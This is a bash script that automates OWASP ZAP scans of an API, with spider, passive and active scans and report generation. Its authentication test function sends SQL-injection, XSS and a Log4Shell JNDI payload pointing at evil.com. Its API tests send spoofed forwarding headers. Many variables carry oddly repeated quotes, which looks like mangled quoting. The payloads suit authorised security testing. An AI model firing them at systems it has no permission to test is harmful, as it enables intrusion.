#!/bin/bash

# OWASP ZAP Automated Security Testing Script
# This script performs comprehensive security testing using OWASP ZAP

set -euo pipefail

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname """"$SCRIPT_DIR"""")"
RESULTS_DIR=""""$PROJECT_ROOT"""/zap-security-results"
TARGET_URL="${TARGET_URL:-http://localhost:8080}"
ZAP_PORT="${ZAP_PORT:-8090}"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Create results directory
mkdir -p """"$RESULTS_DIR""""
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Logging functions
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if ZAP is available
check_zap_availability() {
    log_info "Checking OWASP ZAP availability..."
    
    if command -v zap.sh &> /dev/null; then
        log_success "OWASP ZAP found in PATH"
        ZAP_CMD="zap.sh"
    elif command -v docker &> /dev/null; then
        log_info "Using OWASP ZAP Docker container"
        ZAP_CMD="docker run -u zap -p ${ZAP_PORT}:8080 -v ${RESULTS_DIR}:/zap/wrk/:rw -t owasp/zap2docker-stable"
    else
        log_error "OWASP ZAP not found. Please install ZAP or Docker."
        exit 1
    fi
}

# Start ZAP daemon
start_zap_daemon() {
    log_info "Starting OWASP ZAP daemon..."
    
    if [[ """"$ZAP_CMD"""" == *"docker"* ]]; then
        # Start ZAP in daemon mode using Docker
        docker run -u zap -d --name zap-daemon -p ${ZAP_PORT}:8080 \
            -v "${RESULTS_DIR}:/zap/wrk/:rw" \
            owasp/zap2docker-stable zap.sh -daemon -host 0.0.0.0 -port 8080 \
            -config api.addrs.addr.name=.* -config api.addrs.addr.regex=true
    else
        # Start ZAP daemon locally
        zap.sh -daemon -port """$ZAP_PORT""" -config api.addrs.addr.name=.* -config api.addrs.addr.regex=true &
        ZAP_PID=$!
    fi
    
    # Wait for ZAP to start
    log_info "Waiting for ZAP to start..."
    sleep 30
    
    # Check if ZAP is responding
    if curl -s "http://localhost:${ZAP_PORT}/JSON/core/view/version/" > /dev/null; then
        log_success "ZAP daemon started successfully"
    else
        log_error "Failed to start ZAP daemon"
        exit 1
    fi
}

# Stop ZAP daemon
stop_zap_daemon() {
    log_info "Stopping ZAP daemon..."
    
    if [[ """"$ZAP_CMD"""" == *"docker"* ]]; then
        docker stop zap-daemon 2>/dev/null || true
        docker rm zap-daemon 2>/dev/null || true
    else
        if [ -n "${ZAP_PID:-}" ]; then
            kill """$ZAP_PID""" 2>/dev/null || true
        fi
    fi
}

# Spider scan
run_spider_scan() {
    log_info "Running spider scan on """$TARGET_URL"""..."
    
    # Start spider scan
    SPIDER_ID=$(curl -s "http://localhost:${ZAP_PORT}/JSON/spider/action/scan/?url=${TARGET_URL}" | jq -r '.scan')
    
    if [ """"$SPIDER_ID"""" = "null" ] || [ -z """"$SPIDER_ID"""" ]; then
        log_error "Failed to start spider scan"
        return 1
    fi
    
    log_info "Spider scan started with ID: """$SPIDER_ID""""
    
    # Wait for spider scan to complete
    while true; do
        STATUS=$(curl -s "http://localhost:${ZAP_PORT}/JSON/spider/view/status/?scanId=${SPIDER_ID}" | jq -r '.status')
        PROGRESS=$(curl -s "http://localhost:${ZAP_PORT}/JSON/spider/view/status/?scanId=${SPIDER_ID}" | jq -r '.status')
        
        log_info "Spider scan progress: ${PROGRESS}%"
        
        if [ """"$STATUS"""" = "100" ]; then
            break
        fi
        
        sleep 10
    done
    
    log_success "Spider scan completed"
    
    # Get spider results
    curl -s "http://localhost:${ZAP_PORT}/JSON/spider/view/results/?scanId=${SPIDER_ID}" > "${RESULTS_DIR}/spider_results_${TIMESTAMP}.json"
}

# Active scan
run_active_scan() {
    log_info "Running active security scan on """$TARGET_URL"""..."
    
    # Start active scan
    SCAN_ID=$(curl -s "http://localhost:${ZAP_PORT}/JSON/ascan/action/scan/?url=${TARGET_URL}" | jq -r '.scan')
    
    if [ """"$SCAN_ID"""" = "null" ] || [ -z """"$SCAN_ID"""" ]; then
        log_error "Failed to start active scan"
        return 1
    fi
    
    log_info "Active scan started with ID: """$SCAN_ID""""
    
    # Wait for active scan to complete
    while true; do
        STATUS=$(curl -s "http://localhost:${ZAP_PORT}/JSON/ascan/view/status/?scanId=${SCAN_ID}" | jq -r '.status')
        
        log_info "Active scan progress: ${STATUS}%"
        
        if [ """"$STATUS"""" = "100" ]; then
            break
        fi
        
        sleep 30
    done
    
    log_success "Active scan completed"
    
    # Get active scan results
    curl -s "http://localhost:${ZAP_PORT}/JSON/ascan/view/messagesIds/?scanId=${SCAN_ID}" > "${RESULTS_DIR}/active_scan_results_${TIMESTAMP}.json"
}

# Passive scan
run_passive_scan() {
    log_info "Running passive security scan..."
    
    # Enable all passive scan rules
    curl -s "http://localhost:${ZAP_PORT}/JSON/pscan/action/enableAllScanners/"
    
    # Wait for passive scanning to complete
    while true; do
        RECORDS_TO_SCAN=$(curl -s "http://localhost:${ZAP_PORT}/JSON/pscan/view/recordsToScan/" | jq -r '.recordsToScan')
        
        if [ """"$RECORDS_TO_SCAN"""" = "0" ]; then
            break
        fi
        
        log_info "Passive scan - records remaining: """$RECORDS_TO_SCAN""""
        sleep 10
    done
    
    log_success "Passive scan completed"
}

# Authentication testing
run_authentication_tests() {
    log_info "Running authentication-specific tests..."
    
    # Test login endpoint
    log_info "Testing login endpoint..."
    curl -s "http://localhost:${ZAP_PORT}/JSON/core/action/accessUrl/?url=${TARGET_URL}/api/v1/auth/login"
    
    # Test various authentication payloads
    local auth_payloads=(
        '{"username":"admin","password":"password"}'
        '{"username":"admin'\''--","password":"password"}'
        '{"username":"admin","password":"password'\'' OR 1=1--"}'
        '{"username":"<script>alert(1)</script>","password":"password"}'
        '{"username":"admin","password":"${jndi:ldap://evil.com/a}"}'
    )
    
    for payload in "${auth_payloads[@]}"; do
        curl -s -X POST \
            -H "Content-Type: application/json" \
            -d """"$payload"""" \
            "http://localhost:${ZAP_PORT}/JSON/core/action/sendRequest/" \
            --data-urlencode "request=POST ${TARGET_URL}/api/v1/auth/login HTTP/1.1
Host: $(echo """$TARGET_URL""" | cut -d'/' -f3)
Content-Type: application/json
Content-Length: ${#payload}

"""$payload""""
    done
    
    log_success "Authentication tests completed"
}

# API security testing
run_api_security_tests() {
    log_info "Running API-specific security tests..."
    
    # Test API endpoints with various payloads
    local api_endpoints=(
        "/api/v1/health"
        "/api/v1/auth/me"
        "/api/v1/organizations"
        "/api/v1/debates"
        "/api/v1/security/monitoring/metrics"
    )
    
    for endpoint in "${api_endpoints[@]}"; do
        log_info "Testing endpoint: """$endpoint""""
        
        # Test various HTTP methods
        for method in GET POST PUT DELETE PATCH OPTIONS TRACE; do
            curl -s "http://localhost:${ZAP_PORT}/JSON/core/action/accessUrl/?url=${TARGET_URL}${endpoint}" \
                --data-urlencode "method="""$method""""
        done
        
        # Test with malicious headers
        curl -s "http://localhost:${ZAP_PORT}/JSON/core/action/sendRequest/" \
            --data-urlencode "request=GET ${TARGET_URL}${endpoint} HTTP/1.1
Host: $(echo """$TARGET_URL""" | cut -d'/' -f3)
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Cluster-Client-IP: 127.0.0.1"
    done
    
    log_success "API security tests completed"
}

# Generate comprehensive report
generate_zap_report() {
    log_info "Generating comprehensive security report..."
    
    # Get all alerts
    curl -s "http://localhost:${ZAP_PORT}/JSON/core/view/alerts/" > "${RESULTS_DIR}/alerts_${TIMESTAMP}.json"
    
    # Generate HTML report
    curl -s "http://localhost:${ZAP_PORT}/OTHER/core/other/htmlreport/" > "${RESULTS_DIR}/security_report_${TIMESTAMP}.html"
    
    # Generate XML report
    curl -s "http://localhost:${ZAP_PORT}/OTHER/core/other/xmlreport/" > "${RESULTS_DIR}/security_report_${TIMESTAMP}.xml"
    
    # Generate JSON report
    curl -s "http://localhost:${ZAP_PORT}/JSON/core/view/alerts/" > "${RESULTS_DIR}/security_report_${TIMESTAMP}.json"
    
    # Generate markdown summary
    generate_markdown_summary
    
    log_success "Security reports generated in """$RESULTS_DIR""""
}

# Generate markdown summary
generate_markdown_summary() {
    local alerts_file="${RESULTS_DIR}/alerts_${TIMESTAMP}.json"
    local summary_file="${RESULTS_DIR}/security_summary_${TIMESTAMP}.md"
    
    cat > """"$summary_file"""" << EOF
# OWASP ZAP Security Testing Summary

**Date:** $(date)  
**Target:** """$TARGET_URL"""  
**Tool:** OWASP ZAP Automated Security Scanner  

---

## Executive Summary

EOF
    
    if [ -f """"$alerts_file"""" ]; then
        # Count alerts by risk level
        local high_alerts=$(jq '[.alerts[] | select(.risk == "High")] | length' """"$alerts_file"""" 2>/dev/null || echo "0")
        local medium_alerts=$(jq '[.alerts[] | select(.risk == "Medium")] | length' """"$alerts_file"""" 2>/dev/null || echo "0")
        local low_alerts=$(jq '[.alerts[] | select(.risk == "Low")] | length' """"$alerts_file"""" 2>/dev/null || echo "0")
        local info_alerts=$(jq '[.alerts[] | select(.risk == "Informational")] | length' """"$alerts_file"""" 2>/dev/null || echo "0")
        
        cat >> """"$summary_file"""" << EOF
### Alert Summary

- **High Risk:** $high_alerts
- **Medium Risk:** """$medium_alerts"""  
- **Low Risk:** $low_alerts
- **Informational:** $info_alerts

### Risk Assessment

EOF
        
        if [ """"$high_alerts"""" -gt 0 ]; then
            echo "🚨 **CRITICAL** - High-risk vulnerabilities detected requiring immediate attention" >> """"$summary_file""""
        elif [ """"$medium_alerts"""" -gt 5 ]; then
            echo "⚠️ **HIGH** - Multiple medium-risk issues require prompt attention" >> """"$summary_file""""
        elif [ """"$medium_alerts"""" -gt 0 ]; then
            echo "🔶 **MEDIUM** - Some security issues identified" >> """"$summary_file""""
        else
            echo "✅ **LOW** - No significant security issues detected" >> """"$summary_file""""
        fi
        
        # List high and medium risk alerts
        if [ """"$high_alerts"""" -gt 0 ] || [ """"$medium_alerts"""" -gt 0 ]; then
            cat >> """"$summary_file"""" << EOF

### Critical Issues

EOF
            jq -r '.alerts[] | select(.risk == "High" or .risk == "Medium") | "- **" + .name + "** (" + .risk + "): " + .description' """"$alerts_file"""" 2>/dev/null >> """"$summary_file"""" || echo "Error processing alerts" >> """"$summary_file""""
        fi
    else
        echo "No alerts data available" >> """"$summary_file""""
    fi
    
    cat >> """"$summary_file"""" << EOF

---

## Detailed Reports

- **HTML Report:** security_report_${TIMESTAMP}.html
- **XML Report:** security_report_${TIMESTAMP}.xml  
- **JSON Report:** security_report_${TIMESTAMP}.json
- **Alerts JSON:** alerts_${TIMESTAMP}.json

## Recommendations

1. **Address all high-risk vulnerabilities immediately**
2. **Review and fix medium-risk issues within 30 days**
3. **Implement additional security controls as needed**
4. **Schedule regular security testing**
5. **Update security policies and procedures**

---

**Next Security Assessment:** $(date -d '+3 months')
EOF
    
    log_success "Markdown summary generated: """$summary_file""""
}

# Custom security rules
load_custom_security_rules() {
    log_info "Loading custom security rules..."
    
    # Enable specific scan rules for API security
    local api_rules=(
        "10026"  # Cross Site Scripting (Reflected)
        "10027"  # Cross Site Scripting (Persistent)
        "90019"  # SQL Injection
        "90020"  # NoSQL Injection
        "10095"  # Directory Browsing
        "10096"  # Server Side Include
        "40026"  # Cross-Domain Misconfiguration
        "90011"  # Charset Mismatch
        "10021"  # X-Content-Type-Options
        "10020"  # X-Frame-Options
    )
    
    for rule in "${api_rules[@]}"; do
        curl -s "http://localhost:${ZAP_PORT}/JSON/ascan/action/enableScanners/?ids=${rule}" > /dev/null
    done
    
    log_success "Custom security rules loaded"
}

# Main execution function
main() {
    log_info "Starting OWASP ZAP automated security testing"
    log_info "Target: """$TARGET_URL""""
    log_info "Results directory: """$RESULTS_DIR""""
    
    # Setup trap to cleanup on exit
    trap stop_zap_daemon EXIT
    
    # Check prerequisites
    check_zap_availability
    
    # Start ZAP daemon
    start_zap_daemon
    
    # Load custom security rules
    load_custom_security_rules
    
    # Run security tests
    run_spider_scan
    run_passive_scan
    run_authentication_tests
    run_api_security_tests
    run_active_scan
    
    # Generate reports
    generate_zap_report
    
    log_success "OWASP ZAP security testing completed"
    log_info "Check the results in: """$RESULTS_DIR""""
}

# Help function
show_help() {
    echo "OWASP ZAP Automated Security Testing Script"
    echo ""
    echo "Usage: $0 [options]"
    echo ""
    echo "Options:"
    echo "  -h, --help              Show this help message"
    echo "  -u, --url URL           Target URL (default: http://localhost:8080)"
    echo "  -p, --port PORT         ZAP proxy port (default: 8090)"
    echo ""
    echo "Environment Variables:"
    echo "  TARGET_URL              Target URL to test"
    echo "  ZAP_PORT                ZAP proxy port"
    echo ""
    echo "Examples:"
    echo "  $0                                  Test localhost:8080"
    echo "  $0 -u https://api.example.com      Test external API"
    echo "  $0 -u http://localhost:8080 -p 8091"
    echo ""
    echo "Prerequisites:"
    echo "  - OWASP ZAP installed OR Docker available"
    echo "  - jq command line tool"
    echo "  - curl command line tool"
    echo ""
}

# Parse command line arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -h|--help)
            show_help
            exit 0
            ;;
        -u|--url)
            TARGET_URL="$2"
            shift 2
            ;;
        -p|--port)
            ZAP_PORT="$2"
            shift 2
            ;;
        *)
            echo "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

# Check prerequisites
if ! command -v jq &> /dev/null; then
    log_error "jq is required but not installed. Please install jq."
    exit 1
fi

if ! command -v curl &> /dev/null; then
    log_error "curl is required but not installed. Please install curl."
    exit 1
fi

# Run main function
main